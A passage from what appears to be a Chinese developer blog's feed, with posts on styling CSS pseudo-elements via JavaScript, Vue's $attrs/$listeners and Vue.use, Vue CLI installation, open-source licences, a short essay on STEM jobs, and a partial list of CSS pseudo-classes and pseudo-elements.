      <link href="/Blog/2019/05/17/essay/%E5%A6%82%E4%BD%95%E7%94%A8js%E6%94%B9%E5%8F%98%E4%BC%AA%E5%85%83%E7%B4%A0%E7%9A%84%E6%A0%B7%E5%BC%8F%EF%BC%9F/index/"/>
      <url>/Blog/2019/05/17/essay/%E5%A6%82%E4%BD%95%E7%94%A8js%E6%94%B9%E5%8F%98%E4%BC%AA%E5%85%83%E7%B4%A0%E7%9A%84%E6%A0%B7%E5%BC%8F%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<p>在工作偶尔会遇到改变伪元素样式的场景，虽然也有很多解决方法，<br>但是这个方法能让你<strong>像操作正常元素一样操作伪元素样式</strong>。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> ruleSelector(selector) &#123;</span><br><span class="line">  <span class="keyword">function</span> uni(selector) &#123;</span><br><span class="line">    <span class="keyword">return</span> selector.replace(/::/g, <span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  // es6</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">Array</span>.<span class="keyword">from</span>(document.styleSheets).reduce((a,b) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> a.concat(<span class="keyword">Array</span>.<span class="keyword">from</span>(b.cssRules))</span><br><span class="line">  &#125;, []).<span class="keyword">filter</span>(x =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> uni(x.selectorText) === uni(selector);</span><br><span class="line">  &#125;)</span><br><span class="line">  // es5</span><br><span class="line">  // <span class="keyword">return</span> <span class="keyword">Array</span>.prototype.<span class="keyword">filter</span>.<span class="keyword">call</span>(<span class="keyword">Array</span>.prototype.concat.apply([], <span class="keyword">Array</span>.prototype.map.<span class="keyword">call</span>(document.styleSheets, <span class="keyword">function</span> (x) &#123;</span><br><span class="line">  //   <span class="keyword">return</span> <span class="keyword">Array</span>.prototype.<span class="keyword">slice</span>.<span class="keyword">call</span>(x.cssRules);</span><br><span class="line">  // &#125;)), <span class="keyword">function</span> (x) &#123;</span><br><span class="line">  //   <span class="keyword">return</span> uni(x.selectorText) === uni(selector);</span><br><span class="line">  // &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var toggle = <span class="keyword">false</span>,</span><br><span class="line">  pseudo = ruleSelector(&quot;ref::before&quot;).<span class="keyword">slice</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">document.querySelector(&quot;article&quot;).onclick = <span class="keyword">function</span> () &#123;</span><br><span class="line">  pseudo.<span class="keyword">forEach</span>(<span class="keyword">function</span> (<span class="keyword">rule</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (toggle = !toggle)</span><br><span class="line">      <span class="keyword">rule</span>.style.color = &quot;red&quot;;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">rule</span>.style.color = &quot;black&quot;;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>所以我是文科出身？</title>
      <link href="/Blog/2019/05/17/daisy/%E6%89%80%E4%BB%A5%E6%88%91%E6%98%AF%E6%96%87%E7%A7%91%E5%87%BA%E8%BA%AB%EF%BC%9F/index/"/>
      <url>/Blog/2019/05/17/daisy/%E6%89%80%E4%BB%A5%E6%88%91%E6%98%AF%E6%96%87%E7%A7%91%E5%87%BA%E8%BA%AB%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<p>一篇<a href="https://blogs.scientificamerican.com/observations/on-pi-day-lets-disrupt-our-narrow-notions-of-stem/">新闻报道</a>提到，美国就业行情最好的十种工作，八种是 STEM 岗位。</p><p>所谓 STEM，就是科学（<strong>S</strong>cience）、技术（<strong>T</strong>echnology）、工程（<strong>E</strong>ngineering）、机械（<strong>M</strong>achine）的缩写。也就是说，就业最好的工作，80%是理工科岗位。这跟我的感觉一致，<strong>理工科的就业远远好于文科。</strong></p><p>现在是信息社会，大量的工作都是技术岗，需要技术工人和工程师，而传统的办公室文秘和管理岗位，由于被软件替代，正在不断减少。这种趋势以后将会越来越明显。理工科学生往往有好几个 offer 可以挑选，文科学生想要一个 offer 都很难，很多人不得不选择考研和考公务员。</p><p>所以，中学生选择大学专业的时候，为了就业，建议尽量选择理工科，不要选择文史哲和理论经济学，否则毕业以后，找工作很困难。</p><p>除了就业难，文科学生的发展前景也不好。文科培养的其实不是技能，而是思想。但是国内的社会环境，根本不允许你有独立的思想，能做的只是诠释领导的政策。一个例证就是，我国现在培养出了各种各样的人才，但是似乎就是没有思想家。</p><blockquote><p>当初读文科就是奔着培养思想去的(手动狗头)ORZ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> daisy </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Attrs 和 Listeners</title>
      <link href="/Blog/2019/05/14/vue/Attrs%E5%92%8CListeners/index/"/>
      <url>/Blog/2019/05/14/vue/Attrs%E5%92%8CListeners/index/</url>
      
        <content type="html"><![CDATA[<p>这两个属性是 <code>vue 2.4</code> 版本之后提供的，它简直是二次封装组件或者说写高阶组件的神器。在我们平时写业务的时候免不了需要对一些第三方组件进行二次封装。比如我们需要基于 <code>el-select</code> 分装一个带有业务特性的组件，根据输入的 <code>name</code> 搜索用户，并将一些业务逻辑分装在其中。但 <code>el-select</code> 这个第三方组件支持几十个配置参数，我们当然可以适当的挑选几个参数通过 <code>props</code> 来传递，但万一哪天别人用你的业务组件的时候觉得你的参数少了，那你只能改你封装的组件了，亦或是哪天第三方组件加入了新参数，你该怎么办？</p><p>其实我们的这个组件只是基于 <code>el-select</code> 做了一些业务的封装，比如添加了默认的 <code>placeholder</code>，封装了远程 <code>ajax</code> 搜索请求等等，总的来说它就是一个中间人组件，只负责传递数据而已。</p><p><strong>这时候我们就可以使用 <code>v-bind=&quot;$attrs&quot;</code> ：传递所有属性、<code>v-on=&quot;$listeners&quot;</code> 传递所有方法。如下图所示：</strong></p><p><img src="/Blog/2019/05/14/vue/Attrs%E5%92%8CListeners/index/img.png"></p><p>这样，我们没有在 <code>$props</code> 中声明的方法和属性，会通过 <code>$attrs</code>、<code>$listeners</code> 直接传递下去。这两个属性在我们平时分装第三方组件的时候非常有用！</p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue-cli 安装 vue 方法</title>
      <link href="/Blog/2019/05/07/vue/Vue-cli%E5%AE%89%E8%A3%85vue%20%E6%96%B9%E6%B3%95/index/"/>
      <url>/Blog/2019/05/07/vue/Vue-cli%E5%AE%89%E8%A3%85vue%20%E6%96%B9%E6%B3%95/index/</url>
      
        <content type="html"><![CDATA[<p>总是要上官网搜索vue-cli，上网速度太慢，记录于此。</p><h2 id="Vue-CLI-gt-x3D-3"><a href="#Vue-CLI-gt-x3D-3" class="headerlink" title="Vue CLI &gt;&#x3D; 3"></a>Vue CLI &gt;&#x3D; 3</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install <span class="operator">-</span>g <span class="variable">@vue</span><span class="operator">/</span>cli</span><br><span class="line"># <span class="keyword">OR</span></span><br><span class="line">yarn <span class="keyword">global</span> <span class="keyword">add</span> <span class="variable">@vue</span><span class="operator">/</span>cli</span><br><span class="line"></span><br><span class="line">vue <span class="keyword">create</span> my<span class="operator">-</span>app</span><br></pre></td></tr></table></figure><h2 id="Vue-CLI-2"><a href="#Vue-CLI-2" class="headerlink" title="Vue CLI 2"></a>Vue CLI 2</h2><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install -g <span class="meta">@vue</span>/cli-<span class="keyword">init</span></span><br><span class="line"># vue <span class="keyword">init</span> now works exactly the same <span class="keyword">as</span> vue-<span class="symbol">cli@</span><span class="number">2.</span>x</span><br><span class="line">vue <span class="keyword">init</span> webpack my-project</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于Vue.prototype 和 vue.use()</title>
      <link href="/Blog/2019/04/29/vue/%E5%85%B3%E4%BA%8EVue.prototype%E5%92%8Cvue.use()/index/"/>
      <url>/Blog/2019/04/29/vue/%E5%85%B3%E4%BA%8EVue.prototype%E5%92%8Cvue.use()/index/</url>
      
        <content type="html"><![CDATA[<p>首先，不管你采用哪种方式，最终实现的调用方式都是</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.api<span class="comment">()</span></span><br></pre></td></tr></table></figure><p>也就是说，两种方法，实现的原理都是在 <code>Vue.prototype</code> 上添加了一个方法。所以结论是<strong>“没有区别”</strong>。</p><p>再来说说 <code>Vue.use()</code> 到底干了什么。</p><p>我们知道，<code>Vue.use()</code> 可以让我们安装一个自定义的Vue插件。为此，我们需要声明一个<code> install</code> 函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个简单的插件 say.js</span></span><br><span class="line"><span class="keyword">var</span> install = <span class="keyword">function</span>(<span class="params">Vue</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (install.<span class="property">installed</span>) <span class="keyword">return</span> <span class="comment">// 如果已经注册过了，就跳过</span></span><br><span class="line">  install.<span class="property">installed</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">defineProperties</span>(<span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>, &#123;</span><br><span class="line">    <span class="attr">$say</span>: &#123;</span><br><span class="line">      <span class="attr">value</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am a plugin&#x27;</span>)&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = install</span><br></pre></td></tr></table></figure><p>然后我们要注册这个插件</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> say <span class="keyword">from</span> <span class="string">&#x27;./say.js&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(say)</span><br></pre></td></tr></table></figure><p>这样，在每个 <code>Vue</code> 的实例里我们都能调用 <code>say</code> 方法了。</p><p>我们来看 <code>Vue.use</code> 方法内部是怎么实现的</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Vue.<span class="keyword">use</span> = function (<span class="keyword">plugin</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">plugin</span>.installed) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// additional parameters</span></span><br><span class="line">  <span class="keyword">var</span> <span class="keyword">args</span> = toArray(arguments, 1);</span><br><span class="line">  <span class="keyword">args</span>.unshift(this);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">plugin</span>.install === &#x27;function&#x27;) &#123;</span><br><span class="line">    <span class="keyword">plugin</span>.install.apply(<span class="keyword">plugin</span>, <span class="keyword">args</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">plugin</span>.apply(null, <span class="keyword">args</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">plugin</span>.installed = true;</span><br><span class="line">  <span class="keyword">return</span> this;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其实也就是调用了这个 <code>install</code> 方法而已。</p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何选择开源许可证？</title>
      <link href="/Blog/2019/04/16/essay/%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81%EF%BC%9F/index/"/>
      <url>/Blog/2019/04/16/essay/%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<p>如何为代码选择开源许可证，这是一个问题。</p><p>世界上的开源许可证，大概有<a href="http://www.gnu.org/licenses/license-list.html">上百种</a>。很少有人搞得清楚它们的区别。即使在最流行的六种—-<a href="http://www.gnu.org/licenses/gpl.html">GPL</a>、<a href="http://en.wikipedia.org/wiki/BSD_licenses">BSD</a>、<a href="http://en.wikipedia.org/wiki/MIT_License">MIT</a>、<a href="http://www.mozilla.org/MPL/">Mozilla</a>、<a href="http://www.apache.org/licenses/LICENSE-2.0">Apache</a>和<a href="http://www.gnu.org/copyleft/lesser.html">LGPL</a>—-之中做选择，也很复杂。</p><p>乌克兰程序员<a href="http://pbagwl.com/post/5078147450/description-of-popular-software-licenses">Paul Bagwell</a>，画了一张分析图，说明应该怎么选择。这是我见过的最简单的讲解，只用两分钟，你就能搞清楚这六种许可证之间的最大区别。</p><p>下面是我制作的中文版，请点击看大图。</p><p><img src="/Blog/2019/04/16/essay/%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81%EF%BC%9F/index/img.png"></p><p><a href="http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>谈谈css里面伪类和伪元素</title>
      <link href="/Blog/2019/04/16/essay/%E8%B0%88%E8%B0%88css%E9%87%8C%E9%9D%A2%E4%BC%AA%E7%B1%BB%E5%92%8C%E4%BC%AA%E5%85%83%E7%B4%A0/index/"/>
      <url>/Blog/2019/04/16/essay/%E8%B0%88%E8%B0%88css%E9%87%8C%E9%9D%A2%E4%BC%AA%E7%B1%BB%E5%92%8C%E4%BC%AA%E5%85%83%E7%B4%A0/index/</url>
      
        <content type="html"><![CDATA[<p>目录（按 <code>vscode</code> 中的提示来）</p><p><img src="/Blog/2019/04/16/essay/%E8%B0%88%E8%B0%88css%E9%87%8C%E9%9D%A2%E4%BC%AA%E7%B1%BB%E5%92%8C%E4%BC%AA%E5%85%83%E7%B4%A0/index/img.png"><br><img src="/Blog/2019/04/16/essay/%E8%B0%88%E8%B0%88css%E9%87%8C%E9%9D%A2%E4%BC%AA%E7%B1%BB%E5%92%8C%E4%BC%AA%E5%85%83%E7%B4%A0/index/img_1.png"><br><img src="/Blog/2019/04/16/essay/%E8%B0%88%E8%B0%88css%E9%87%8C%E9%9D%A2%E4%BC%AA%E7%B1%BB%E5%92%8C%E4%BC%AA%E5%85%83%E7%B4%A0/index/img_2.png"><br><img src="/Blog/2019/04/16/essay/%E8%B0%88%E8%B0%88css%E9%87%8C%E9%9D%A2%E4%BC%AA%E7%B1%BB%E5%92%8C%E4%BC%AA%E5%85%83%E7%B4%A0/index/img_3.png"><br><img src="/Blog/2019/04/16/essay/%E8%B0%88%E8%B0%88css%E9%87%8C%E9%9D%A2%E4%BC%AA%E7%B1%BB%E5%92%8C%E4%BC%AA%E5%85%83%E7%B4%A0/index/img_4.png"><br><img src="/Blog/2019/04/16/essay/%E8%B0%88%E8%B0%88css%E9%87%8C%E9%9D%A2%E4%BC%AA%E7%B1%BB%E5%92%8C%E4%BC%AA%E5%85%83%E7%B4%A0/index/img_5.png"><br><img src="/Blog/2019/04/16/essay/%E8%B0%88%E8%B0%88css%E9%87%8C%E9%9D%A2%E4%BC%AA%E7%B1%BB%E5%92%8C%E4%BC%AA%E5%85%83%E7%B4%A0/index/img_6.png"></p><h1 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h1><h2 id="一、-after"><a href="#一、-after" class="headerlink" title="一、 ::after"></a>一、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::after">::after</a></h2><blockquote><p>常用方法</p></blockquote><h2 id="二、-backdrop"><a href="#二、-backdrop" class="headerlink" title="二、 ::backdrop"></a>二、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::backdrop">::backdrop</a></h2><blockquote><p>设置某些全屏元素的背景<br>例如视频的全屏后的背景（默认为黑色）我们可以改成<a href="https://www.zhangxinxu.com/study/201812/video-backdrop.php">这样</a><br>或者配合 <code>fullscreen</code> API，<a href="https://www.zhangxinxu.com/study/201812/fullscreen-backdrop.php">看这里</a><br>其对于背景的控制优先级小于 <code>:fullscreen</code></p></blockquote><h2 id="三、-before"><a href="#三、-before" class="headerlink" title="三、 ::before"></a>三、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::before">::before</a></h2><blockquote><p>常用方法</p></blockquote><h2 id="四、-content"><a href="#四、-content" class="headerlink" title="四、 ::content"></a>四、 ::content</h2><blockquote><p>暂无</p></blockquote><h2 id="五、-cue"><a href="#五、-cue" class="headerlink" title="五、 ::cue"></a>五、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::cue">::cue</a></h2><blockquote><p>配合视频中的<a href="https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API">字幕</a>用</p></blockquote><h2 id="六、-cue"><a href="#六、-cue" class="headerlink" title="六、 ::cue()"></a>六、 ::cue()</h2><blockquote><p>暂无</p></blockquote><h2 id="七、-cue-region"><a href="#七、-cue-region" class="headerlink" title="七、 ::cue-region"></a>七、 ::cue-region</h2><blockquote><p>暂无</p></blockquote><h2 id="八、-cue-region"><a href="#八、-cue-region" class="headerlink" title="八、 ::cue-region()"></a>八、 ::cue-region()</h2><blockquote><p>暂无</p></blockquote><h2 id="九、-first-letter"><a href="#九、-first-letter" class="headerlink" title="九、 ::first-letter"></a>九、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::first-letter">::first-letter</a></h2><blockquote><p><code>::first-letter会</code>选中某 <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Visual_formatting_model#Block-level_elements_and_block_boxes">block-level element</a>（块级元素）第一行的第一个字母，并且文字所处的行之前没有其他内容（如图片和内联的表格）<br><a href="https://www.zhangxinxu.com/study/201609/first-letter-with-display-value.html">体验连接</a><br>使用此特性改变第一个字的颜色**<a href="https://www.zhangxinxu.com/study/201609/first-letter-color-important.html">优先级最高</a>**(高于 <code>!improtant</code> )<br>如果遇到符号会有些意外<a href="https://www.zhangxinxu.com/study/201609/first-letter-special-character.html">情况</a><br><a href="https://www.zhangxinxu.com/study/201609/first-letter-example-no-tag-ui-control.html">实际使用栗子</a></p></blockquote><h2 id="十、-first-line"><a href="#十、-first-line" class="headerlink" title="十、 ::first-line"></a>十、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::first-line">::first-line</a></h2><blockquote><p>基本同上，只不过改变的是第一行颜色</p></blockquote><h2 id="十一、-grammer-error"><a href="#十一、-grammer-error" class="headerlink" title="十一、 ::grammer-error"></a>十一、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::grammar-error">::grammer-error</a></h2><blockquote><p>应用于浏览器标识为语法错误的文本段，<strong>暂无浏览器支持</strong></p></blockquote><h2 id="十二、-placeholder"><a href="#十二、-placeholder" class="headerlink" title="十二、 ::placeholder"></a>十二、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::placeholder">::placeholder</a></h2><blockquote><p>改变 <code>placeholder</code> 文本样式</p></blockquote><h2 id="十三、-selection"><a href="#十三、-selection" class="headerlink" title="十三、 ::selection"></a>十三、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::selection">::selection</a></h2><blockquote><p>改变浏览器对选中的文本<a href="https://codepen.io/melonxx/pen/dLRNob?&editable=true">样式</a><br><img src="/Blog/2019/04/16/essay/%E8%B0%88%E8%B0%88css%E9%87%8C%E9%9D%A2%E4%BC%AA%E7%B1%BB%E5%92%8C%E4%BC%AA%E5%85%83%E7%B4%A0/index/img_7.png"></p></blockquote><h2 id="十四、-shadow"><a href="#十四、-shadow" class="headerlink" title="十四、 ::shadow"></a>十四、 ::shadow</h2><blockquote><p>暂无</p></blockquote><h2 id="十五、-slotted"><a href="#十五、-slotted" class="headerlink" title="十五、 ::slotted"></a>十五、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::slotted">::slotted</a></h2><blockquote><p>用于选定那些被放在 HTML模板 中的元素</p></blockquote><h2 id="十六、-speclling-error"><a href="#十六、-speclling-error" class="headerlink" title="十六、 ::speclling-error"></a>十六、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::spelling-error">::speclling-error</a></h2><blockquote><p>表示浏览器标记为不正确拼写的文本段，<strong>暂无浏览器支持</strong></p></blockquote><h1 id="伪类"><a href="#伪类" class="headerlink" title="伪类"></a>伪类</h1><h2 id="一、-action"><a href="#一、-action" class="headerlink" title="一、 :action"></a>一、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:active">:action</a></h2><blockquote><p>常用方法</p></blockquote><h2 id="二、-any-link"><a href="#二、-any-link" class="headerlink" title="二、 :any-link"></a>二、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:any-link">:any-link</a></h2><blockquote><p>:link 的升级版，它会匹配每一个有 <code>href</code> 属性的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/a" title="HTML &lt;a&gt; 元素（或称锚元素）可以创建通向其他网页、文件、同一页面内的位置、电子邮件地址或任何其他 URL 的超链接。"><code>&lt;a&gt;</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/area" title="HTML &lt;area&gt; 元素 在图片上定义一个热点区域，可以关联一个超链接。&lt;area&gt;元素仅在&lt;map&gt;元素内部使用。"><code>&lt;area&gt;</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/link" title="HTML 中&lt;link&gt;元素规定了外部资源与当前文档的关系。 这个元素可用来为导航定义一个关系框架。这个元素最常于链接样式表。"><code>&lt;link&gt;</code></a> 元素</p></blockquote><h2 id="三、-blank"><a href="#三、-blank" class="headerlink" title="三、 :blank"></a>三、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:-moz-only-whitespace">:blank</a></h2><blockquote><p>匹配如下节点 1. 没有子节点; 2. 仅有空的文本节点; 3. 仅有空白符的文本节点;<br><strong>暂无浏览器支持</strong></p></blockquote><h2 id="四、-checked"><a href="#四、-checked" class="headerlink" title="四、 :checked"></a>四、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:checked">:checked</a></h2><blockquote><p>常用方法</p></blockquote><h2 id="五、-corner-persent"><a href="#五、-corner-persent" class="headerlink" title="五、 :corner-persent"></a>五、 :corner-persent</h2><blockquote><p>暂无</p></blockquote><h2 id="六、-decrement"><a href="#六、-decrement" class="headerlink" title="六、 :decrement"></a>六、 :decrement</h2><blockquote><p>暂无</p></blockquote><h2 id="七、-default"><a href="#七、-default" class="headerlink" title="七、 :default"></a>七、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:default">:default</a></h2><blockquote><p>该选择器可以在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/button"><code>&lt;button&gt;</code></a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/checkbox"><code>&lt;input type=&quot;checkbox&quot;&gt;</code></a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/radio"><code>&lt;input type=&quot;radio&quot;&gt;</code></a>, 以及 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/option" title="在web表单中,  HTML元素 &lt;option&gt;  用于定义在&lt;select&gt;,  &lt;optgroup&gt; 或&lt;datalist&gt; 元素中包含的项。&lt;option&gt; 可以在弹出窗口和 html 文档中的其他项目列表中表示菜单项。"><code>&lt;option&gt;</code></a> 上使用<br>用于默认选中的样式</p></blockquote><h2 id="八、-defined"><a href="#八、-defined" class="headerlink" title="八、 :defined"></a>八、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:defined">:defined</a></h2><blockquote><p><em>测试结果和官方定义有出入</em></p></blockquote><h2 id="九、-dir"><a href="#九、-dir" class="headerlink" title="九、 :dir"></a>九、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:dir">:dir</a></h2><blockquote><p>匹配特定文字书写方向的元素，<strong>暂无浏览器支持</strong></p></blockquote><h2 id="十、-disabled"><a href="#十、-disabled" class="headerlink" title="十、 :disabled"></a>十、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:disabled">:disabled</a></h2><blockquote><p>常用方法</p></blockquote><h2 id="十一、-double-button"><a href="#十一、-double-button" class="headerlink" title="十一、 :double-button"></a>十一、 :double-button</h2><blockquote><p>暂无</p></blockquote><h2 id="十二、-empty"><a href="#十二、-empty" class="headerlink" title="十二、 :empty"></a>十二、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:empty">:empty</a></h2><blockquote><p>常用方法</p></blockquote><h2 id="十三、-enabled"><a href="#十三、-enabled" class="headerlink" title="十三、 :enabled"></a>十三、 :enabled</h2><blockquote><p>常用方法</p></blockquote><h2 id="十四、-end"><a href="#十四、-end" class="headerlink" title="十四、 :end"></a>十四、 :end</h2><blockquote><p>暂无</p></blockquote><h2 id="十五、-first"><a href="#十五、-first" class="headerlink" title="十五、 :first"></a>十五、 :first</h2><blockquote><p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@page" title="@page 规则用于在打印文档时修改某些CSS属性。你不能用@page规则来修改所有的CSS属性，而是只能修改margin,orphans,widow 和 page breaks of the document。对其他属性的修改是无效的。"><code>@page</code></a><code>:first</code>描述的是：打印文档的时候，第一页的样式。<br><a href="https://codepen.io/anon/pen/pBPZEZ?&editable=true">栗子</a></p></blockquote><h2 id="十六、-first-child"><a href="#十六、-first-child" class="headerlink" title="十六、 :first-child"></a>十六、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:first-child">:first-child</a></h2><blockquote><p> 常用方法、避免和 <code>:first</code> 搞混</p></blockquote><h2 id="十七、-first-of-type"><a href="#十七、-first-of-type" class="headerlink" title="十七、 :first-of-type"></a>十七、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:first-of-type">:first-of-type</a></h2><blockquote><p>和 <code>:first-child</code> 相比表示匹配第一次出现的<a href="https://codepen.io/melonxx/pen/KYqawZ?&editable=true">元素</a></p></blockquote><h2 id="十八、-focus"><a href="#十八、-focus" class="headerlink" title="十八、 :focus"></a>十八、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:focus">:focus</a></h2><blockquote><p>常用方法</p></blockquote><h2 id="十八、-focus-visible"><a href="#十八、-focus-visible" class="headerlink" title="十八、 :focus-visible"></a>十八、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:focus-visible">:focus-visible</a></h2><blockquote><p>使其仅在键盘(tab)操作时才显示焦点样式 <strong>暂无浏览器支持</strong></p></blockquote><h2 id="十九、-focus-within"><a href="#十九、-focus-within" class="headerlink" title="十九、 :focus-within"></a>十九、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:focus-within">:focus-within</a></h2><blockquote><p>捕捉元素的后代元素获得焦点事件 <a href="https://codepen.io/melonxx/pen/qwjRBG?&editable=true">栗子</a></p></blockquote><h2 id="二十、-fullscreen"><a href="#二十、-fullscreen" class="headerlink" title="二十、 :fullscreen"></a>二十、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:fullscreen">:fullscreen</a></h2><blockquote><p>fullscreen应用于当前处于全屏显示模式的元素。 它不仅仅选择顶级元素，还包括所有已显示的栈内元素<br>其对于背景的控制优先级大于 <code>::backdrop</code></p></blockquote><h2 id="二十一、-future"><a href="#二十一、-future" class="headerlink" title="二十一、 :future"></a>二十一、 